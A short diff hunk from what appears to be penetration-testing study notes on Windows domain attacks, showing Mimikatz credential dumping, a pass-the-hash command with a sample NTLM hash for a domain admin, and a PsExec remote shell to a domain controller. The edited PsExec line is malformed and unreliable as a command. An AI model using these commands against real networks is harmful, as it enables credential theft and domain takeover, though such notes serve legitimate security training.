@@ -133,7 +133,7 @@ sekurlsa::logonpasswords
 sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
 net use \\dc01(logon server)
 klist
-.\PsExec.exe \\dc01 cmd.exe
+.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
 ###### Pass the Ticket
 ```
